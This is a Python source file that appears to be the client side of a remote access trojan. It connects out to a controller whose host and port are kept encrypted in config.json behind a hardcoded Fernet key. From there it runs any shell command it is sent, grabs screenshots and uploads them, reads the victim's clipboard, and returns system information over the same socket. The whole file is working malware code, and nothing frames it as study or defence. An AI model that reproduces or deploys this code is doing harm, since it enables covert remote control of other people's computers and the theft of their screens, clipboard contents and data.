import socket
import subprocess
import json
import os
from cryptography.fernet import Fernet
from Modules.clipboard import grab_clipboard
from Modules.screenshot import grab_screen
from Modules.information import get_info

KEY = b'FtABmI-psWsyRuNo-ZqCGFjhdhUlB6RcNxORcdKcN7Q='
cipher = Fernet(KEY)

def load_config():
    try:
        with open('config.json', 'r') as file:
            data = json.load(file)
        host = cipher.decrypt(data['a1'].encode()).decode()
        port = int(cipher.decrypt(data['a2'].encode()).decode())
        return host, port
    except Exception as e:
        print(f"Config error: {e}")
        exit(1)

def send_file(s, file_path):
    if file_path and os.path.exists(file_path):
        filesize = os.path.getsize(file_path)
        s.send(str(filesize).encode())
        s.recv(1024) # Wait for 'READY'
        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk: break
                s.sendall(chunk)
        # Optional: Clean up by deleting local screenshot after sending
        # os.remove(file_path)
        return f"File {file_path} sent successfully."
    return "Error: File not found."

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return result.decode()
    except Exception as e:
        return str(e)

def main():
    host, port = load_config()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
    except: return

    while True:
        try:
            command = s.recv(1024).decode().strip().lower()
            if not command or command == 'exit': break

            if command == "screenshot":
                file_name = grab_screen() # Should return just the filename
                result = send_file(s, file_name)
            elif command == "clip":
                result = grab_clipboard()
            elif command == "sysinfo":
                result = get_info()
            else:
                result = execute_command(command)

            if not result: result = "Command complete."
            s.sendall(result.encode())
        except: break
    s.close()

if __name__ == "__main__":
    main()
